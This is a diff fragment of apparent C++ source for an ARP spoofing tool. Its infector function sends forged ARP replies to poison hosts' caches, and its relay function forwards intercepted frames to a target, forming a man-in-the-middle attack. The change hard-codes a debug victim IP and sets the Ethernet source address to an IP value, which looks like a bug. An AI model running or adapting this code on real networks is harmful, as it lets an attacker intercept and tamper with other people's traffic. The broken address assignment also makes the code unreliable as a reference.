@@ -59,16 +59,20 @@ void Spoofer::infector(std::map<IPv4Address, HWAddress<6>> addresses)
         for(const auto elem : addresses)
         {
             //To avoid recursive infection
-            if(elem.first==target_ip)
+//            if(elem.first==target_ip)
+//                continue;
+
+            //debug code
+            if(elem.first!="192.168.0.225")
                 continue;
 
-//            if(elem.first!="192.168.0.69")
-//                continue;
+
             arp_infection=arp.make_arp_reply(elem.first,target_ip,elem.second,local_mac);
 
             sender.send(arp_infection,iface);
+            sleep(5);
         }
-        usleep(500);
+
     }
 }
 
@@ -108,7 +112,9 @@ bool Spoofer::relay(PDU &pdu)
     if((ip.dst_addr() != local_ip) && (ethII.dst_addr() == local_mac))
     {
 
-        //change dest mac to origin target mac
+        //change to src mat to local mac to prevent CAM table! ****
+        ethII.src_addr(local_ip);
+        //forwarding to target
         ethII.dst_addr(target_mac);
 
         //relay
